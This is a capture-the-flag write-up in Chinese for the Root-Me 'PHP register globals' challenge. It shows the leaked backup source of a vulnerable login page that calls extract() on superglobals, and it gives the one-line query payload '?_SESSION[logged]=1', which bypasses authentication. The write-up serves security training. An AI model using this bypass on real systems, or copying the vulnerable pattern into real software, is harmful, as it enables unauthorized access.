Root-Me [PHP register globals](https://www.root-me.org/en/Challenges/Web-Server/PHP-register-globals)
===

提供一個有頁面，僅能輸入密碼。

## 解題關鍵
1. PHP register globals
2. Backup leak

## 提示訊息
```
It seems that the developper often leaves backup files around...
```

## 解題方法
依照提示訊息嘗試尋找備份檔案，並發現備份檔案名稱為 `index.php.bak`，將檔案下載下來後瀏覽原始碼，並簡單瀏覽驗證的部分。  

```php
<?php
function auth($password, $hidden_password){
    $res=0;
    if (isset($password) && $password!=""){
        if ( $password == $hidden_password ){
            $res=1;
        }
    }
    $_SESSION["logged"]=$res;
    return $res;
}

function display($res){
    $aff= '
	  <html>
	  <head>
	  </head>
	  <body>
	    <h1>Authentication v 0.05</h1>
	    <form action="" method="POST">
	      Password&nbsp;<br/>
	      <input type="password" name="password" /><br/><br/>
	      <br/><br/>
	      <input type="submit" value="connect" /><br/><br/>
	    </form>
	    <h3>'.htmlentities($res).'</h3>
	  </body>
	  </html>';
    return $aff;
}

session_start();
if ( ! isset($_SESSION["logged"]) )
    $_SESSION["logged"]=0;

$aff="";
include("config.inc.php");

if (isset($_POST["password"]))
    $password = $_POST["password"];

if (!ini_get('register_globals')) {
    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);
    if (isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach ($superglobals as $superglobal) {
        extract($superglobal, 0 );
    }
}

if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}
echo $aff;
?>

```

該題目名稱為 `PHP register globals`，所以應該可以直接設定變數的值，仔細觀察、思考該程式碼，發現變數 `res` 必須要等於 `1` 才會去設定 `_SESSION["logged"]` 的值，但如果要透過 Function `auth` 有做 `$res = 0` 的初始化動作，表示無法透過 `res` 來設定 `_SESSION["logged"]`。

```php
function auth($password, $hidden_password){
    $res=0;
    if (isset($password) && $password!=""){
        if ( $password == $hidden_password ){
            $res=1;
        }
    }
    $_SESSION["logged"]=$res;
    return $res;
}
```

接著直接看最關鍵的部分，只要密碼正確或是 `_SESSION["logged"] == 1` 就會秀出 Flag，但不確定是否連 `_SESSION["logged"]` 都可以透過 `PHP register globals` 的方式值接做修改...。
```PHP
if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}
echo $aff;
```

結果是肯定的，Payload 如下，解決該題。

```
?_SESSION[logged]=1
```

## Reference

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)